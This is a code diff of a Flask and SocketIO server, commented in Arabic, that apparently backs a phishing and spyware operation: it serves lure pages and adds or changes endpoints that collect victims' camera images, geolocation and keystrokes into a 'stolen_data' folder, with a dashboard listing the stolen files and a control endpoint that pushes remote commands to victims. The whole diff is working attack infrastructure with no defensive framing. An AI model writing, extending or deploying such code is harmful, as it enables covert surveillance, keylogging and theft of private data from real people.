@@ -6,18 +6,20 @@ from datetime import datetime
 from flask import Flask, request, jsonify, render_template, send_file
 from flask_socketio import SocketIO
 
-# 1. إعداد التطبيق مع تحديد المجلدات بدقة لضمان عملها على Render
+# 1. إعداد المسارات المطلقة لضمان العثور على الملفات في Render
+template_dir = os.path.abspath('templates')
+static_dir = os.path.abspath('static')
+
 app = Flask(__name__, 
-            template_folder='templates', 
-            static_folder='static',
-            static_url_path='/static')
+            template_folder=template_dir, 
+            static_folder=static_dir)
 
 app.config['SECRET_KEY'] = 'cairopy_sec_2024'
 
-# 2. إعداد SocketIO مع وضع gevent لضمان استقرار التحكم عن بُعد
+# 2. استخدام async_mode='gevent' لضمان استقرار التحكم عن بُعد
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')
 
-# 3. إعداد مسارات حفظ البيانات المسروقة (تنشأ تلقائياً)
+# 3. إعداد مجلدات التخزين
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")
 
@@ -27,20 +29,17 @@ for folder in folders:
 
 VICTIM_IP = "Unknown"
 
-# ========== مسارات صفحات الهجوم (داخل مجلد templates) ==========
+# ========== صفحات الهجوم (داخل مجلد templates) ==========
 @app.route('/')
-def index_attack():
-    return render_template('index.html')
+def index_attack(): return render_template('index.html')
 
 @app.route('/image')
-def image_attack():
-    return render_template('image.html')
+def image_attack(): return render_template('image.html')
 
 @app.route('/qr')
-def qr_attack():
-    return render_template('qr.html')
+def qr_attack(): return render_template('qr.html')
 
-# ========== استقبال البيانات من الضحية ==========
+# ========== استقبال البيانات (نفس وظائف V1) ==========
 @app.route('/api/camera', methods=['POST'])
 def receive_camera():
     data = request.json
@@ -55,28 +54,36 @@ def receive_camera():
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 400
 
+@app.route('/api/location', methods=['POST'])
+def receive_location():
+    data = request.json
+    path = os.path.join(STOLEN_DIR, 'location', f"loc_{request.remote_addr.replace('.','_')}.json")
+    with open(path, 'a', encoding='utf-8') as f:
+        f.write(json.dumps(data) + '\n')
+    return jsonify({"status": "ok"})
+
 @app.route('/api/keylog', methods=['POST'])
 def receive_keylog():
     data = request.json
-    ip = request.remote_addr
-    log = {'ip': ip, 'time': datetime.now().isoformat(), 'keys': data.get('keys', ''), 'url': data.get('url', '')}
-    path = os.path.join(STOLEN_DIR, 'keys', f"log_{ip.replace('.','_')}.txt")
+    global VICTIM_IP
+    VICTIM_IP = request.remote_addr
+    path = os.path.join(STOLEN_DIR, 'keys', f"log_{VICTIM_IP.replace('.','_')}.txt")
     with open(path, 'a', encoding='utf-8') as f:
-        f.write(json.dumps(log) + '\n')
+        f.write(json.dumps({'time': datetime.now().isoformat(), 'keys': data.get('keys', '')}) + '\n')
     return jsonify({"status": "ok"})
 
 # ========== لوحة التحكم (المتحكم) ==========
+@app.route('/dashboard')
+def dashboard():
+    # قراءة أسماء الملفات لعرضها في القوائم
+    files_map = {f: os.listdir(os.path.join(STOLEN_DIR, f)) for f in folders}
+    return render_template('dashboard.html', files=files_map, victim_ip=VICTIM_IP)
+
 @app.route('/api/control', methods=['POST'])
 def control_victim():
     data = request.json
-    socketio.emit('control', data) # إرسال الأمر للضحية فوراً
+    socketio.emit('control', data) # إرسال الأمر للضحية
     return jsonify({"status": "sent"})
-
-@app.route('/dashboard')
-def dashboard():
-    # قراءة الملفات المسروقة لعرضها في اللوحة
-    files_map = {f: os.listdir(os.path.join(STOLEN_DIR, f)) for f in folders}
-    return render_template('dashboard.html', files=files_map, victim_ip=VICTIM_IP)
 
 @app.route('/stolen/<category>/<filename>')
 def serve_stolen(category, filename):
